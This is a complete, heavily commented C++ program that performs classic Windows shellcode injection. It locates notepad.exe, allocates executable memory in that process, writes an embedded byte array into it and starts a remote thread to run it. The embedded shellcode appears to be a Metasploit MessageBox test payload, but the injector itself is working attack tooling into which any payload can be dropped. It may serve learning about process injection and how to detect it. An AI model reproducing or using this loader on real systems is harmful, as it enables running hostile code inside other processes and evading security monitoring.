// #include <windows.h> enables Windows API functions, allows us to call OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, CloseHandle, etc. 
// As well as defining types like DWORD, HANDLE, LPVOID
// and constants like MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
// basically anything related to memory management, process/thread handling, and system level operations
#include <windows.h> 

// #include <tlhelp32.h> specifically enables functionality for interacting with running processes
// so things like CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, etc. 
// Needed to iterate through running processes and taking snapshots
#include <tlhelp32.h> 

// for input output
#include <iostream>

// harmless tester shellcode
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"
"\x52\x18\x51\x56\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
"\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
"\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
"\x58\x41\x58\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
"\x20\x4d\x53\x46\x21\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65"
"\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x41\x58\x48\x31\xc9"
"\x41\xba\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41"
"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59"
"\x41\x89\xda\xff\xd5";

DWORD GetTargetPID(const wchar_t* procName) {
    PROCESSENTRY32 entry;  // Struct to hold info about a process
    entry.dwSize = sizeof(PROCESSENTRY32);  // Set the size before use

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Take snapshot of all processes
    if (Process32First(snapshot, &entry)) {  // Iterate through processes
        do {
            if (!_wcsicmp(entry.szExeFile, procName)) {  // Compare process names, disregarding case
                CloseHandle(snapshot);  // Clean up snapshot handle
                return entry.th32ProcessID;   // Return the PID if match found
            }
        } while (Process32Next(snapshot, &entry)); // While there are more processes to iterate through
    }
    CloseHandle(snapshot); // Clean up if no match found to avoid resource leaks (system resource/memory exhaustion)
    return 0; // Return 0 if target process not found
}

// Performs shellcode injection
int main() {
    DWORD pid = GetTargetPID(L"notepad.exe"); // Get PID of notepad.exe
    if (!pid) {
        std::cout << "Target process not found." << std::endl;
        return 1;
    }

    // Open a handle to the target process with full access 
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "Failed to open target process." << std::endl;
        return 1;
    }

    // Allocate memory in the remote process (remote simply means a process different from the one executing this injector code) for the shellcode where
    // hProcess is the target process, nullptr lets OS choose the address, sizeof(shellcode) ensures a sufficient size is allocated,
    // MEM_COMMIT | MEM_RESERVE commits and reserves memory, and PAGE_EXECUTE_READWRITE makes it executable and writable
    LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cout << "Memory allocation failed." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode into the allocated memory of the remote process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), &bytesWritten)) {
        std::cout << "Failed to write shellcode." << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE); // Deallocate previously allocated memory to prevent mem leaks
        CloseHandle(hProcess);
        return 1;
    }

    // Create a thread (sequence of instructions) in the remote process that starts executing at the shellcode
    // where hProcess is target process, nullptr is default security attributes, 0 is default stack size, remoteMemory is start address = beginning of shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
    if (!hThread) {
        std::cout << "Failed to create remote thread." << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish executing
    WaitForSingleObject(hThread, INFINITE);   
    // Clean up handles
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "Shellcode injected successfully." << std::endl;
    return 0;
}
